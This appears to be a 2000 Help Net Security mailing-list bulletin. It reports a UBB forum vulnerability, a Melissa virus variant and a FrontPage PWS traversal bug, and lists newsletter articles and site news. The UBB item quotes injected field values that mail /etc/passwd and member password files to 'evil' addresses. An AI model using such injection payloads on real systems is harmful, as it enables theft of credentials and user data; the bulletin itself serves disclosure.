@@ -1,0 +1,103 @@
+Greetings Net-Sec subscribers, 
+
+Lot of you on the list subscribed to receive Default newsletter directly to your mailbox. You will still receive it after all the articles for Default #8 will be released, and then we will compile it to zip file as we did before. Zipped file will be sent to the list. As we are getting more and more subscribers, we thought that some news bulletins could be sent also sent to the list. Here is the first one :) 
+Do comment it to my e-mail or on HNS webboard. 
+
+
+1) Security issues 
+2) Default 
+3) Net-Sec 
+
+
+1) Security issues 
+
+Couple of days ago, serious hole has been found in Ultimate Bulletin Board (www.ultimatebb.com) software. It is a forum that is being used by a lot of sites including some of the popular ones like www.mp3.com or www.korn.com . With easily editing saved HTML file, attacker could get some very "dangerous" files from your system and privacy of the users of UBB forum could be compromised. 
+Editing "hidden" topic field from "00444.cgi" (or something like it) to "012345.ubb|mail hacker@evil.com </etc/passwd|" could provide the attacker your etc/passwd file. Editing it to "012345.ubb|cat Members/*|mail hacker@evil.org|" could provide the attacker all the passwords from registered users of the forum, their "secret" e-mails and a big (if the board is popular) list of all e-mails which could be used by spamers that we hate so much. 
+On my e-mail to the creators of the board (Infopop Corporation) they replied in an hour saying: "Sir, The current 5.43d contains the patch for this loophole. Thank you." 
+
+Links: 
+UBB homepage (www.ultimatebb.com) 
+PSS - UBB vulnerability found (http://packetstorm.securify.com/0002-exploits/ultimatebb.txt) 
+
+
+WM97/Melissa-AB is new found derivation of infamous Melissa virus. This clone is based upon a number of different Word macro viruses. According to Sophos, it was reported in the wild. 
+Upon closing an infected document the virus does the following: 
+In December, if the day of the month is greater than the 23rd, the virus displays a message box asking: 
+"I wish you a Merry X-mas!! Do you love me ?" 
+If you answer "Yes" the virus responds with 
+"Thank You! I Love You. You are so cute." 
+If you answer "No" the virus responds with: 
+"You are so rude." 
+"@!#$ you, @!#$!" 
+The virus then forwards itself to the first 15 addresses in your mail address book: 
+Subject: An important advice from 
+Message text: Take a look in this Document, urgent suggestions to be a cool man!! ;-) 
+
+Link: 
+Sophos (http://www.sophos.com/virusinfo/analyses/wm97melissaab.html) 
+
+
+Doubledot bug in FrontPage FrontPage Personal Web Server. 
+Compromise: Accessing drive trough browser. 
+Vulnerable Systems: Frontpage-PWS32/3.0.2.926 other versions not tested. 
+Details: When FrontPage-PWS runs a site on your c:\ drive your drive could be accessed by any user accessing your page, simply by requesting any file in any directory except the files in the FrontPage dir. specially /_vti_pvt/. 
+
+Link: 
+PSS (http://packetstorm.securify.com/0002-exploits/frontpage.doubledot.txt) 
+
+
+
+2) Default 
+
+Seven articles were posted to default 
+
+"Default is back" by BHZ [10.02.2000 -- Default 08-01] 
+http://net-security.org/default/08/default-08-01.txt 
+
+"Firewall basics" by /dev/null [10.02.2000 -- Default 08-02] 
+http://net-security.org/default/08/default-08-02.txt 
+
+"Biometrics security devices" by Atlienz [11.02.2000 -- Default 08-03] 
+http://net-security.org/default/08/default-08-03.txt 
+
+"Windows NT Security Check Part I" by Slash [14.02.2000 -- Default 08-04] 
+http://net-security.org/default/08/default-08-04.txt 
+
+"Credit Card authorization process" by daworm [17.02.2000 -- Default 08-05] 
+http://net-security.org/default/08/default-08-05.txt 
+
+"Trendy security" by Blue Boar [21.02.2000 -- Default 08-06] 
+http://net-security.org/default/08/default-08-06.txt 
+
+"A DDOS defeating technique based on routing" by Fernando P. Schapachnik [21.02.2000 -- Default 08-07] 
+http://net-security.org/default/08/default-08-07.txt 
+
+
+
+3) Net-Sec 
+
+This will primary being a place when you could find news about Help Net Security web site. 
+
+We added HNS headlines to the new formed backend section. It is the list of last 10 news items featured on Help Net Security. 
+HNS backend - http://www.net-security.org/backend 
+HNS headlines - http://net-security.org/headlines.shtml 
+HNS headlines in action - http://www.security.nl 
+
+Thanks to Oliver Mengue for making HNS news readable on Palm Pilots. HNS channel could be accessed trough AvantGo.com account. 
+Palm HNS - http://www.net-security.org/mobile/palm/ 
+
+If you want a place where you could chat and/or give your comments or ideas on HNS, please join channel #security on irc.gammaforce.org . Much thanks to WHiTe VaMPiRe and Ladi for always being there :) 
+Java IRC applet - http://net-security.org/irc 
+Gamma Force - http://www.gammaforce.org 
+ProjectGamma http://www.projectgamma.com 
+
+Affiliates section is always enlarging :) 
+Affiliates - http://www.net-security.org/info/affiliates.htm 
+
+HNS phorum 
+Join the discussions - http://net-security.org/webboard.htm 
+
+
+Berislav Kucan - BHZ 
+bhz@net-security.org 
+http://net-security.org
